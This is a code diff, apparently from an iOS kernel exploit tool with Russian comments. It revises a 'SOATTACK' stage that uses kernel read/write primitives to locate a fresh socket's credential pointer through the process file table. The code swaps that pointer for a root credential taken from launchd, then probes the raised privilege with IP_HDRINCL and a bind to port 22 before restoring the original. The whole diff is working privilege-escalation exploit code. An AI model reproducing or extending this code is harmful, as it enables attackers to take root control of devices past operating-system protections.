@@ -2394,12 +2394,13 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 }
                 if (tfd >= 0) close(tfd);
             }
-            // 2.0.48: so_cred свап на НАШЕМ сокете (KRW-примитив). Сокетные
-            // привилегии (bind на низкий порт / IP_HDRINCL) проверяются по so_cred.
+            // 2.0.49: so_cred свап на СВЕЖЕМ сокете. Важный урок 2.0.48:
+            // setsockopt на controlSocket = syscall по повреждённому KRW-inpcb
+            // → мгновенный ребут. KRW-сокет НЕ ТРОГАЕМ вообще; все пробы
+            // идут на новом AF_INET сокете, у которого so_cred измеряем и
+            // свапаем тем же kwrite (0x21-gated), restore до close.
             {
                 extern uint64_t rwSocketPcb;
-                extern int controlSocket;
-                // rootZVA живёт внутри блока FGATTACK — пересчитываем локально
                 uint64_t rootZVA = 0;
                 {
                     uint64_t ldP = [self findSelfProcByPidFast:1 log:nil];
@@ -2407,30 +2408,53 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                     uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
                     if (ldUc && (uint32_t)early_kread64(ldUc + 0x18) == 0) rootZVA = ldUc;
                 }
-                uint64_t sockVA = rwSocketPcb ? kp_untag_ptr(early_kread64(rwSocketPcb + off_inpcb_inp_socket)) : 0;
-                uint64_t sPA = kpLooksLikeKernelPointer(sockVA) ? kvtophys(sockVA & ~0x3fffULL) : 0;
+                int ts = socket(AF_INET, SOCK_DGRAM, 0);
+                kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] свежий сокет fd=%d rootZVA=%#llx", ts, (unsigned long long)rootZVA]);
+                uint64_t sGlob = 0, sFpRaw = 0, sFdOf = 0, sVA = 0;
+                if (ts >= 0 && rootZVA && selfProc) {
+                    kpRead(selfProc + 0xF8, &sFdOf, 8, "fd_ofiles", r);
+                    uint64_t ofiles2 = kp_untag_ptr(sFdOf);
+                    if (kpLooksLikeKernelPointer(ofiles2))
+                        kpRead(ofiles2 + (uint64_t)ts * 8, &sFpRaw, 8, "ofiles[ts]", r);
+                    uint64_t fp2 = kp_untag_ptr(sFpRaw);
+                    if (kpLooksLikeKernelPointer(fp2))
+                        kpRead(fp2 + off_fileproc_fp_glob, &sGlob, 8, "fileproc.glob", r);
+                    uint64_t glob2 = kp_untag_ptr(sGlob);
+                    // сокет = fg_data файла (fileglob+0x38, проверено в necp-цепи)
+                    uint64_t datRaw = 0;
+                    if (kpLooksLikeKernelPointer(glob2))
+                        kpRead(glob2 + 0x38, &datRaw, 8, "fileglob.data", r);
+                    sVA = kp_untag_ptr(datRaw);
+                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] fileglob=%#llx socket=%#llx", (unsigned long long)glob2, (unsigned long long)sVA]);
+                }
+                uint64_t sPA = kpLooksLikeKernelPointer(sVA) ? kvtophys(sVA & ~0x3fffULL) : 0;
                 int sT = sPA ? kpFrameTypeOf(sPA) : -1;
-                kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] socket=%#llx pagePA=%#llx тип=%d", (unsigned long long)sockVA, (unsigned long long)sPA, sT]);
                 uint32_t socOff = 0xFFFFFFFF;
-                if (kpLooksLikeKernelPointer(sockVA)) {
+                if (kpLooksLikeKernelPointer(sVA)) {
                     for (uint32_t o = 0; o + 8 <= 0x300; o += 8)
-                        if (kp_untag_ptr(early_kread64(sockVA + o)) == curUcred) { socOff = o; break; }
-                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] so_cred offset=%@",
-                              socOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", socOff] : @"not found"]);
+                        if (kp_untag_ptr(early_kread64(sVA + o)) == curUcred) { socOff = o; break; }
                 }
+                kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] socket pagePA=%#llx тип=%d so_cred offset=%@",
+                          (unsigned long long)sPA, sT,
+                          socOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", socOff] : @"not found"]);
                 if (socOff != 0xFFFFFFFF && sT == 0x21 && rootZVA) {
-                    uint64_t old = early_kread64(sockVA + socOff);
-                    early_kwrite64(sockVA + socOff, rootZVA);
-                    uint64_t rb2 = early_kread64(sockVA + socOff);
+                    uint64_t old = early_kread64(sVA + socOff);
+                    early_kwrite64(sVA + socOff, rootZVA);
+                    uint64_t rb2 = early_kread64(sVA + socOff);
                     int one = 1;
-                    int pHdr = setsockopt(controlSocket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
-                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] so_cred->root: readback=%#llx IP_HDRINCL=%d errno=%d — %@",
-                              (unsigned long long)rb2, pHdr, errno,
-                              (rb2 == rootZVA && pHdr == 0) ? @"SOCKET-ROOT WIN" : (rb2 == rootZVA ? @"свап держится, проба мимо" : @"не прилипло")]);
-                    early_kwrite64(sockVA + socOff, old);
+                    int pHdr = setsockopt(ts, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+                    struct sockaddr_in sin; memset(&sin, 0, sizeof(sin));
+                    sin.sin_family = AF_INET; sin.sin_port = htons(22); sin.sin_addr.s_addr = htonl(INADDR_ANY);
+                    int pBind = bind(ts, (struct sockaddr *)&sin, sizeof(sin));
+                    kpNote(r, [NSString stringWithFormat:@"  [SOATTACK] so_cred->root: readback=%#llx IP_HDRINCL=%d bind22=%d errno=%d — %@",
+                              (unsigned long long)rb2, pHdr, pBind, errno,
+                              (rb2 == rootZVA && (pHdr == 0 || pBind == 0)) ? @"SOCKET-ROOT WIN" : (rb2 == rootZVA ? @"свап держится, пробы мимо" : @"не прилипло")]);
+                    if (pHdr == 0 || pBind == 0) kpNote(r, @"=== SOCKET-ROOT WIN: сокетная привилегия прошла от имени root ===");
+                    early_kwrite64(sVA + socOff, old);
                 } else {
-                    kpNote(r, @"  [SOATTACK] пропуск: тип не 0x21 или so_cred не найден");
+                    kpNote(r, @"  [SOATTACK] пропуск: тип не 0x21 / so_cred не найден / нет rootZVA");
                 }
+                if (ts >= 0) close(ts);
             }
     return r;
 }
